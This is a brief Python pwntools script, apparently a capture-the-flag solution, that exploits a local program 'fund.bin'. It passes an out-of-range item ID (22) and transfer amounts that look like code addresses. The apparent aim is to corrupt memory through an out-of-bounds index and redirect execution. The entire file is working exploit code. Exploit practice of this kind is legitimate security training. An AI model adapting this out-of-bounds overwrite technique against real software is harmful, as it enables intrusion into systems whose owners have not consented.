#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./fund.bin")
    for i in range(4):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"2")
    print(p.recvuntil(b"Input the ID of item you want to withdraw money from: "))
    p.sendline(b"22")
    print(p.recvuntil(b"Input the ID of item you want to invest more money: "))
    p.sendline(b"1")
    print(p.recvuntil(b"Decide how much to move: "))
    p.sendline(b"4199674")

    for i in range(4):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"2")
    print(p.recvuntil(b"Input the ID of item you want to withdraw money from: "))
    p.sendline(b"3")
    print(p.recvuntil(b"Input the ID of item you want to invest more money: "))
    p.sendline(b"22")
    print(p.recvuntil(b"Decide how much to move: "))
    p.sendline(b"4198870")
    
    for i in range(4):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"3")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
